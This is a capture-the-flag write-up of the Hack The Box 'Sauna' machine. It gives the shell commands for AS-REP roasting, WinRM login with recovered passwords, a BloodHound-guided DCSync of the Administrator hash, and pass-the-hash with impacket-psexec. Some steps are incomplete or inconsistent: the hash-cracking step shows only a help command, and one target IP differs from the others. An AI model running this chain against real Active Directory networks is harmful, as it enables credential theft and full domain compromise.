HTB - Sauna

Active DirectoryAS-REP RoastingUsername AnarchyDCSync

Target IP: 10.129.95.180

Recon

Port Scanning

LDAP enumeration with windapsearch confirms that anonymous binds are allowed.

Foothold

Username Anarchy is used to generate common username permutations from the full names gathered during LDAP enumeration. After saving the full names to a text file, the script is run:

./username-anarchy --input-file /home/kali/Desktop/HTB/sauna/fullname.txt first,flast,first.last,firstl > /home/kali/Desktop/HTB/sauna/username.txt

Each generated username is then tested for AS-REP Roasting:

while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hash.txt; done < username.txt

One account, fsmith, has Kerberos pre-authentication disabled and returns a crackable hash:

krb5asrep$23

The hash is cracked with hashcat:

hashcat --help | grep Kerberos

Credentials obtained:

  • User: fsmith
  • Password: Thestrokes23

These credentials allow authentication over WinRM (port 5985).

Privilege Escalation

Running WinPEAS on the target uncovers another set of stored credentials.

evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

BloodHound is used to map out AD permissions for this new account:

sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All

The graph reveals that SVC_LOANMGR holds a GetChangesAll edge on the domain object — equivalent to DCSync rights. This is abused to dump the Administrator’s password hash directly:

impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator

Result:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::

This hash is used directly for a Pass-the-Hash attack to gain full administrative access:

```bash
impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
